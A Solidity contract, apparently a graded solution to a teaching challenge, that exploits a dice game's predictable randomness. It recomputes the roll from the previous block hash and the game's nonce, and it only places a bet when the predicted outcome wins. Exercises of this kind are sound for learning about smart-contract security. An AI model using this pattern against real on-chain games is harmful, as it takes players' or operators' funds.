pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    /////////////////
    /// Errors //////
    /////////////////

    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);

    //////////////////////
    /// State Variables //
    //////////////////////

    DiceGame public diceGame;

    ///////////////////
    /// Constructor ///
    ///////////////////

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    ///////////////////
    /// Functions /////
    ///////////////////

    receive() external payable {}

    function riggedRoll() external {
        uint256 minAmount = 0.002 ether;
        uint256 balance = address(this).balance;

        if (balance < minAmount) {
            revert NotEnoughETH(minAmount, balance);
        }

        bytes32 previousBlockHash = blockhash(block.number - 1);
        uint256 currentNonce = diceGame.nonce();

        bytes32 resultHash = keccak256(
            abi.encodePacked(previousBlockHash, address(diceGame), currentNonce)
        );

        uint256 predictedRoll = uint256(resultHash) % 16;

        if (predictedRoll > 5) {
            revert NotWinningRoll(predictedRoll);
        }

        diceGame.rollTheDice{value: minAmount}();
    }
}
